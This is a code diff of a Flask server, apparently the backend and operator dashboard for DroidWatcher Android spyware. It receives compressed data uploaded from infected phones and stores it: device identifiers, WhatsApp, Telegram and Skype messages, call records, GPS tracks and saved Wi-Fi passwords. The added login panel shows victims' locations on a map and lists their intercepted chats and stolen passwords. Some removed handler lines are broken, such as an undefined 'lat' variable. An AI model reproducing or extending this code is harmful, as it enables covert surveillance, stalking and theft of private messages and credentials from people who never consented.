@@ -1,226 +1,181 @@
-import zlib
 import base64
-import traceback
 import json
-import datetime
-import unicodedata
+import sys
+import traceback
+import zlib
 
-from flask import Flask, jsonify, abort, request, make_response, url_for
+from flask import (Flask, abort, jsonify, make_response, redirect,
+                   render_template, request, session, url_for)
 
-
-from curiosus import db, app
-from curiosus.models import Location, WirelessPassword, Device, SkypeAuthor, SkypeMessage, WhatsAppAuthor, WhatsAppMessage, TelegramAuthor, TelegramMessage
+from curiosus import app, db
+from curiosus.auth import authenticate, login_required
+from curiosus.data import get_last_chat_messages, get_last_devices_locations
+from curiosus.forms import LoginForm
+from curiosus.handlers import *
+from curiosus.models import (ActionLog, Device, Location, SkypeAuthor,
+                             SkypeMessage, TelegramAuthor, TelegramMessage,
+                             WhatsAppAuthor, WhatsAppMessage, WirelessPassword)
+from flask_googlemaps import GoogleMaps, Map
 
 LATEST_VERSION = 5000
 LATEST_VERSION_FILE = 'FILE'
 LATEST_VERSION_CHECKSUM = 'BANANA'
 
-def remove_control_characters(s):
-    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    form = LoginForm()
+    if request.method == 'GET':
+
+        return render_template('login.html',
+                               title='Sign In',
+                               form=form)
+
+    elif request.method == 'POST':
+        if form.validate_on_submit():
+
+            user = authenticate(form.email.data, form.password.data)
+            if user:
+                session['user'] = user
+                return redirect(url_for('dashboard'))
+
+        return 'Bad login'
 
 
-def timestamp_to_date(timestamp, miliseconds=True, **kwargs):
-    try:
-        date = datetime.datetime.fromtimestamp(int(timestamp))
-    except:
-        date = datetime.datetime.fromtimestamp(int(timestamp)/1000.0)
-    return date
+@app.route('/logout', methods=['GET'])
+@login_required
+def logout():
+    if request.method == 'GET':
+        session['user'] = None
 
-def log(module, date, msg):
-    date = timestamp_to_date(date)
-    print('[{module}] [{date}] {msg}'.format(module=module, date=date, msg=msg))
+        return redirect(url_for('login'))
 
-def handle_device_info(body):
-    print("*** DEVICE INFO ***")
-    print("Serial: {}".format(body['serial']))
-    print("Brand: {}".format(body['brand']))
-    print("Model: {}".format(body['model']))
-    print("IMEI: {}".format(body['imei']))
-    print("Number: {}".format(body['number']))
-    print("Android Version: {}".format(body['os']))
-    print("Email List: {}".format(', '.join(list(set(body['email_list'].split('|')))).lstrip(', ')))
-    print("DroidWatcher Version: {}".format(body['ver']))
-    print("Root: {}".format(body['root']))
 
-    d = Device.query.filter_by(serial=body['serial']).first()
+@app.route('/dashboard')
+@login_required
+def dashboard():
 
-    if d:
-        d.brand = body['brand']
-        d.model = body['model']
-        d.imei = body['imei']
-        d.android_version = body['os']
-        d.email_list = body['email_list']
-        d.droidwatcher_version = body['ver']
-        d.root = body['root']
-        d.number = body['number']
+    device_count = Device.query.count()
+    messages_count = WhatsAppMessage.query.count() + TelegramMessage.query.count() + SkypeMessage.query.count()
+    location_count = Location.query.count()
+
+    last_10_action_log = ActionLog.query.order_by(ActionLog.date.desc()).limit(10)
+
+    password_count = WirelessPassword.query.count()
+
+    device_locations = get_last_devices_locations()
+
+    last_messages = get_last_chat_messages()
+
+    return render_template('dashboard.html',
+                           title='Dashboard', last_messages=last_messages, device_locations=device_locations, device_count=device_count, messages_count=messages_count, location_count=location_count, last_10_action_log=last_10_action_log, password_count=password_count)
+
+
+@app.route('/device/<imei>')
+@login_required
+def device(imei):
+
+    device = Device.query.filter_by(imei=imei).first()
+    last_location = device.locations.order_by(Location.date.desc()).limit(1).first()
+
+    mymap = Map(style="height:400px;width:900px;margin:0;", identifier='tracking', lat=float(last_location.latitude), lng=float(last_location.longitude), markers=[{'lat': float(l.latitude), 'lng': float(l.longitude), 'infobox': '<p>Date: {}</p><br><p>Device: {}</p><p>Battery: {}<p>Provider: {}</p>'.format(l.date, l.device.imei, l.battery, l.provider)} for l in device.locations.all()])
+
+    return render_template('device.html',
+                           title='Dashboard', mymap=mymap, device=device)
+
+
+@app.route('/devices')
+@login_required
+def devices():
+
+    device_list = Device.query.all()
+
+    return render_template('device_list.html',
+                           title='Dashboard', device_list=device_list)
+
+
+@app.route('/actionlog')
+@login_required
+def actionlog():
+
+    actionlog_list = ActionLog.query.all()
+
+    return render_template('actionlog.html',
+                           title='Dashboard', actionlog_list=actionlog_list)
+
+
+@app.route('/messages/all/<imei>')
+@app.route('/messages/all')
+@login_required
+def messages(imei=None):
+
+    if not imei:
+        messages = []
+        messages += [{'source': 'Telegram', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in TelegramMessage.query.all()]
+        messages += [{'source': 'WhatsApp', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in WhatsAppMessage.query.all()]
+        messages += [{'source': 'Skype', 'text': m.text, 'date': m.date, 'author': m.author.username, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in SkypeMessage.query.all()]
+
     else:
-        d = Device(serial=body['serial'], brand=body['brand'], model=body['model'], imei=body['imei'], number=body['number'], android_version=body['os'], email_list=body['email_list'], droidwatcher_version=body['ver'], root=body['root'])
-    try:
-        db.session.merge(d)
-        db.session.commit()
-    except Exception as e:
-        traceback.print_exc()
+        messages = []
+        messages += [{'source': 'Telegram', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in TelegramMessage.query.filter_by(device_imei=imei).all()]
+        messages += [{'source': 'WhatsApp', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in WhatsAppMessage.query.filter_by(device_imei=imei).all()]
+        messages += [{'source': 'Skype', 'text': m.text, 'date': m.date, 'author': m.author.username, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in SkypeMessage.query.filter_by(device_imei=imei).all()]
 
-def handle_skype(body):
-    for message in body['body']:
-        print('*** SKYPE MESSAGE ***')
-        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['username']))
-        print('Date: {}'.format(timestamp_to_date(message['date'])))
-        print('Text: {}'.format(message['text']))
-        print()
-        d = Device.query.filter_by(imei=body['imei']).first()
-
-        aobj = message['author']
-   
-        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()
-
-        if not a:
-
-            a = SkypeAuthor(username=aobj['username'], fullname=aobj['fullname'], country=aobj['country'], birthday=aobj['birthday'], gender=aobj['gender'], province=aobj['province'], city=aobj['city'], phone=aobj['phone'], homepage=aobj['homepage'], about=aobj['about'], mood=aobj['mood'], external_id=aobj['uid'])
-
-        try:
-            db.session.merge(a)
-            db.session.commit()
-        except Exception as e:
-            traceback.print_exc()
+    return render_template('messages.html',
+                           title='Dashboard', messages=messages)
 
 
-        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()
+@app.route('/messages/telegram/<imei>')
+@app.route('/messages/telegram')
+@login_required
+def messages_telegram(imei=None):
 
-        if a:
-            m = SkypeMessage(author=a.username, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], extra=message['extra'], external_id=message['external_id'], latitude=message['lat'], longitude=lat['lon'], device=d.serial)
+    if not imei:
+        messages = TelegramMessage.query.all()
+    else:
+        messages = TelegramMessage.query.filter_by(device_imei=imei).all()
 
-            try:
-                db.session.add(m)
-                db.session.commit()
-            except Exception as e:
-                traceback.print_exc()
-
-
-def handle_whatsapp(body):
-    for message in body['body']:
-        print('*** WHATSAPP MESSAGE ***')
-        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
-        print('Date: {}'.format(timestamp_to_date(message['date'])))
-        print('Direction: {}'.format(message['type']))
-        print('Text: {}'.format(message['text']))
-        print()
-        d = Device.query.filter_by(imei=body['imei']).first()
-
-        aobj = message['author']
-   
-        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()
-
-        if not a:
-
-            a = WhatsAppAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], mood=aobj['mood'], phone=aobj['phone'])
-
-        try:
-            db.session.merge(a)
-            db.session.commit()
-        except Exception as e:
-            traceback.print_exc()
+    return render_template('messages_telegram.html',
+                           title='Dashboard', messages=messages)
 
 
-        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()
+@app.route('/messages/skype/<imei>')
+@app.route('/messages/skype')
+@login_required
+def messages_skype(imei=None):
 
-        if a:
-            m = WhatsAppMessage(author=a.phone, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], external_id=message[',id'], latitude=message['lat'], longitude=lat['lon'], device=d.serial)
+    if not imei:
+        messages = SkypeMessage.query.all()
+    else:
+        messages = SkypeMessage.query.filter_by(device_imei=imei).all()
 
-            try:
-                db.session.add(m)
-                db.session.commit()
-            except Exception as e:
-                traceback.print_exc()
-
-def handle_telegram(body):
-    for message in body['body']:
-        print('*** TELEGRAM MESSAGE ***')
-        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
-        print('Date: {}'.format(timestamp_to_date(message['date'], convert=False)))
-        print('Direction: {}'.format(message['type']))
-        text = 'W'.join(''.join([chr(x) for x in message['text'].encode('utf-8') if unicodedata.category(chr(x)) != 'Cc']).split('W')[1:])
-        text = text.encode('utf-8').decode('utf-8')
-        print('Text: {}'.format(text))
-        print()
-        d = Device.query.filter_by(imei=body['imei']).first()
-
-        aobj = message['author']
-   
-        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()
-
-        if not a:
-
-            a = TelegramAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], extra=aobj['extra'])
-
-        try:
-            db.session.merge(a)
-            db.session.commit()
-        except Exception as e:
-            traceback.print_exc()
+    return render_template('messages_skype.html',
+                           title='Dashboard', messages=messages)
 
 
-        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()
+@app.route('/messages/whatsapp/<imei>')
+@app.route('/messages/whatsapp')
+@login_required
+def messages_whatsapp(imei=None):
 
-        if a:
-            m = TelegramMessage(author=a.external_id, date=timestamp_to_date(message['date']), text=text, message_type=message['type'], external_id=message['mid'], latitude=message['lat'], longitude=message['lon'], device=d.serial)
+    if not imei:
+        messages = WhatsAppMessage.query.all()
+    else:
+        messages = WhatsAppMessage.query.filter_by(device_imei=imei).all()
 
-            try:
-                db.session.add(m)
-                db.session.commit()
-            except Exception as e:
-                traceback.print_exc()
-
-def handle_call(body):
-    for message in body['body']:
-        print('*** CALL ***')
-        print('Date: {}'.format(timestamp_to_date(message['date'])))
-        print('Name: {}'.format(message['name']))
-        print('Number: {}'.format(message['number']))
-        try:
-            print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
-        except:
-            pass
-        print('Duration: {}'.format(message['duration']))
-        print()
-
-def handle_location(body):
-    for message in body['body']:
-        print('*** LOCATION ***')
-        print('Date: {}'.format(timestamp_to_date(message['date'])))
-        print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
-        print('Battery: {}'.format(message['battery']))
-        print('Provider: {}'.format(message['provider']))
-        print()
-
-        #log('LOCATION', location['date'], 'LAT/LON: {lat}/{lon} | Battery: {battery}'.format(**location)) 
-
-        d = Device.query.filter_by(imei=body['imei']).first()
-
-        l = Location(date=timestamp_to_date(message['date']), latitude=message['lat'], longitude=message['lon'], battery=message['battery'], provider=message['provider'], device=d.serial)
+    return render_template('messages_whatsapp.html',
+                           title='Dashboard', messages=messages)
 
 
-        try:
-            db.session.add(l)
-            db.session.commit()
-        except:
-            traceback.print_exc()
+@app.route('/passwords/wireless')
+@login_required
+def passwords_wireless():
 
-def handle_wireless_password(body):
-    for message in body['body']:
-        print('*** WIRELESS PASSWORD ***')
-        print('ESSID: {}'.format(message['essid']))
-        print('Password: {}'.format(message['password']))
-        print('Key Management: {}'.format(message['key_mgmt']))
-        print()
-        d = Device.query.filter_by(imei=body['imei']).first()
+    wirelesspass_list = WirelessPassword.query.all()
 
-        wp = WirelessPassword(device=d.serial, date=message.get('date', datetime.datetime.now()), key_management=message['key_mgmt'], latitude=message['lat'], longitude=message['lon'], essid=message['essid'], password=message['password'])
-        try:
-            db.session.add(wp)
-            db.session.commit()
-        except:
-            traceback.print_exc()
+    return render_template('wireless_password_list.html',
+                           title='Dashboard', wirelesspass_list=wirelesspass_list)
+
 
 @app.route('/api/v1/version')
 def version():
@@ -232,21 +187,20 @@ def update():
     return 'ok'
 
 
-
 @app.route('/api/v1/service', methods=['GET', 'POST'])
 def service():
     if not request.json:
         abort(400)
     module = request.headers.get('Endpoint')
     print('Got request for endpoint {}'.format(module))
-    body = json.loads(zlib.decompress(base64.b64decode(request.json.get('data')), zlib.MAX_WBITS|16).decode('utf-8'))
+    body = json.loads(zlib.decompress(base64.b64decode(request.json.get('data')), zlib.MAX_WBITS | 16).decode('utf-8'))
     if module in ['DEVICE_INFO']:
         handle_device_info(body)
         return 'ok'
     elif module in ['SETTINGS_SEND']:
-        #print(data)
+        # print(data)
         return 'ok'
-    
+
     try:
         if module in ['GPS', 'ONLINE_LOCATION']:
             handle_location(body)
